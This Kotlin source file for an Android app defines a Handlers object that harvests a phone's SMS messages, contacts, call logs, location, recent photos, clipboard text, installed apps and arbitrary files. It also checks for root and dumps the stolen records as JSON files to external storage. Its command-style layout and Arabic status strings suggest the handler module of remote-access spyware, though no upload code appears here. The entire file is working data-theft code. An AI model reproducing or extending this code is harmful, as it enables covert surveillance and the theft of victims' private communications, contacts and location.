package com.example.namprfek

import android.annotation.SuppressLint
import android.content.ClipboardManager
import android.content.Context
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Telephony
import org.json.JSONArray
import org.json.JSONObject
import java.io.File

object Handlers {

    fun deviceInfo(ctx: Context): String = buildString {
        appendLine("Model: ${Build.MANUFACTURER} ${Build.MODEL}")
        appendLine("Android: ${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT})")
        appendLine("Fingerprint: ${Build.FINGERPRINT}")
        val pm = ctx.packageManager
        append("Root hint: ")
        append(if (File("/system/xbin/su").exists() || File("/system/bin/su").exists()) "su binary present" else "no su")
    }

    private fun dump(name: String, arr: JSONArray): File {
        val f = File(Environment.getExternalStorageDirectory(), name)
        f.writeText(arr.toString(2))
        return f
    }

    @SuppressLint("Range")
    fun sms(ctx: Context): File {
        val arr = JSONArray()
        ctx.contentResolver.query(Telephony.Sms.CONTENT_URI, null, null, null, "date DESC")?.use { c ->
            while (c.moveToNext()) {
                arr.put(JSONObject()
                    .put("from", c.getString(c.getColumnIndexOrThrow("address")))
                    .put("body", c.getString(c.getColumnIndexOrThrow("body")))
                    .put("date", c.getLong(c.getColumnIndexOrThrow("date"))))
                if (arr.length() >= 5000) break
            }
        }
        return dump("sms_${System.currentTimeMillis()}.json", arr)
    }

    @SuppressLint("Range")
    fun contacts(ctx: Context): File {
        val arr = JSONArray()
        ctx.contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)?.use { c ->
            while (c.moveToNext()) {
                arr.put(JSONObject()
                    .put("name", c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)) ?: "")
                    .put("number", c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)) ?: ""))
            }
        }
        return dump("contacts_${System.currentTimeMillis()}.json", arr)
    }

    @SuppressLint("Range")
    fun calls(ctx: Context): File {
        val arr = JSONArray()
        ctx.contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, "${CallLog.Calls.DATE} DESC")?.use { c ->
            while (c.moveToNext()) {
                arr.put(JSONObject()
                    .put("number", c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER)) ?: "")
                    .put("type", c.getInt(c.getColumnIndexOrThrow(CallLog.Calls.TYPE)))
                    .put("duration", c.getLong(c.getColumnIndexOrThrow(CallLog.Calls.DURATION)))
                    .put("date", c.getLong(c.getColumnIndexOrThrow(CallLog.Calls.DATE))))
                if (arr.length() >= 3000) break
            }
        }
        return dump("calls_${System.currentTimeMillis()}.json", arr)
    }

    @SuppressLint("MissingPermission")
    fun location(ctx: Context): String {
        val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
        val providers = lm.getProviders(true)
        for (p in listOf(android.location.LocationManager.GPS_PROVIDER, android.location.LocationManager.NETWORK_PROVIDER)) {
            if (providers.contains(p)) {
                val loc = lm.getLastKnownLocation(p) ?: continue
                return "provider=$p\nlat=${loc.latitude}\nlon=${loc.longitude}\nacc=${loc.accuracy}m"
            }
        }
        return "no location fix"
    }

    fun getLatestPhotos(ctx: Context): List<File> {
        val files = mutableListOf<File>()
        val projection = arrayOf(MediaStore.Images.Media.DATA)
        val cursor = ctx.contentResolver.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, MediaStore.Images.Media.DATE_ADDED + " DESC")
        cursor?.use {
            val col = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)
            var count = 0
            while (it.moveToNext() && count < 5) {
                val path = it.getString(col)
                val f = File(path)
                if (f.exists()) { files.add(f); count++ }
            }
        }
        return files
    }

    fun getClipboard(ctx: Context): String {
        val cb = ctx.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        return cb.primaryClip?.getItemAt(0)?.text?.toString() ?: "الحافظة فاضية"
    }

    fun listFiles(path: String): String {
        val dir = File(path)
        if (!dir.exists()) return "مش موجود: $path"
        return dir.listFiles()?.take(100)?.joinToString("\n") { "${if (it.isDirectory) "📁" else "📄"} ${it.name}" } ?: "مفيش قراءة"
    }

    fun getFile(path: String): File? {
        val f = File(path)
        return if (f.exists() && f.isFile) f else null
    }

    fun apps(ctx: Context): String {
        return ctx.packageManager.getInstalledPackages(0).take(50).joinToString("\n") { p ->
            "${p.packageName}"
        }
    }
}